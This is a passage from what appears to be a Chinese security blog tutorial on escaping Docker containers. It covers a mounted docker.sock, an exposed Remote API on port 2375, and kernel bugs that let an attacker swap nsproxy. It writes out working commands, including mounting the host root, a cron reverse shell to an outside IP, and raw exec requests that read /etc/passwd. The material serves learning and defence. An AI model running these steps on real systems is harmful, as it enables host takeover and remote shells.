+<p>其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。<br>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。<br>因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。</p>
+<p>逃逸的方法主要是以下操作：</p>
+<p>运行一个挂载/var/run/的容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>寻找下挂载的sock文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>在容器内安装client，即docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install docker.io</span><br></pre></td></tr></table></figure>
+
+<p>查看宿主机docker信息并运行一个新容器并挂载宿主机根路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock info</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock run -v /:/<span class="built_in">test</span> -it ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>写入计划任务反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure>
+
+<h3 id="Remote-API未授权访问"><a href="#Remote-API未授权访问" class="headerlink" title="Remote API未授权访问"></a>Remote API未授权访问</h3><p>docker swarm中默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p>
+<p>当使用官方推荐启动方式时</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>
+
+<p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。此时访问/containers/json，便会得到所有容器id字段。创建一个 exec：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/containers/&lt;container_id&gt;/exec</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdin&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdout&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStderr&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Cmd&quot;</span>: [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>],</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;DetachKeys&quot;</span>: <span class="string">&quot;ctrl-p,ctrl-q&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Privileged&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Tty&quot;</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发包后返回exec的id参数</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/exec/&lt;exec_id&gt;/start</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Detach&quot;</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Tty&quot;</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行exec中的命令，成功读取passwd文件，这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸。</p>
+<p>在容器内安装docker，查看宿主机docker镜像信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 images</span><br></pre></td></tr></table></figure>
+
+<p>启动一个容器并将宿主机根目录挂在到容器的test目录，最后又是写计划任务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 run -it -v /:/<span class="built_in">test</span> 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用内核漏洞逃逸"><a href="#利用内核漏洞逃逸" class="headerlink" title="利用内核漏洞逃逸"></a>利用内核漏洞逃逸</h3><p>众所周知的是，docker的容器其实是和宿主机公用同一套内核的，所以如果内存出现漏洞是完全可以进行逃逸的，并且在前面的提到的<code>namespace</code>机制我们可以得知的是进程的<code>task_truct</code>中使用的是<code>nsproxy</code>成员实现的隔离机制，如果我们能够修改这个成员那么就可以完成逃逸了。</p>
+<p>这里针对内核提权过程中的两种情况分别给一下对应的解决办法，在以往的<code>kernel pwn</code>中我们最为熟知的两种提权方式是：</p>
+<p>一、 控制程序执行流</p>
+<p>二、 存在任意地址写</p>
+<p>首先是第一种情况，如果可以直接控制rip的话可以直接调用如下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">switch_task_namespaces</span><span class="params">(struct task_struct *p, struct nsproxy *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> *<span class="title">ns</span>;</span></span><br><span class="line"></span><br><span class="line">	might_sleep();</span><br><span class="line"></span><br><span class="line">	task_lock(p);</span><br><span class="line">	ns = p-&gt;nsproxy;</span><br><span class="line">	p-&gt;nsproxy = <span class="keyword">new</span>;</span><br><span class="line">	task_unlock(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ns)</span><br><span class="line">		put_nsproxy(ns);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过名字和参数可以猜出来该函数的作用就是修改指定<code>task_struct</code>的<code>nsproxy</code>为执行的<code>nsproxy</code>结构体。</p>
+<p>那么第二种情况的时候利用起来也很简单，只需要直接修改当前<code>task_struct</code>的<code>nsproxy</code>为<code>init_proxy</code>即可实现逃逸。</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/09/06/CVE-2022-32250/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CVE-2022-32250</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>&nbsp;-&nbsp;
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-kernel-namespace%E6%9C%BA%E5%88%B6"><span class="nav-text">Linux  kernel namespace机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-kernel%E4%B8%ADnamespace%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">Linux kernel中namespace结构体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker-%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD"><span class="nav-text">Docker 环境判断</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE-dockerenv-%E6%96%87%E4%BB%B6"><span class="nav-text">查找 .dockerenv 文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2-cgroup-%E8%BF%9B%E7%A8%8B"><span class="nav-text">查询 cgroup 进程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker-%E9%80%83%E9%80%B8"><span class="nav-text">Docker 逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-text">特权模式逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="nav-text">如何判断是否为特权模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-sock-%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8"><span class="nav-text">docker.sock 挂载逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">Remote API未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="nav-text">利用内核漏洞逃逸</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
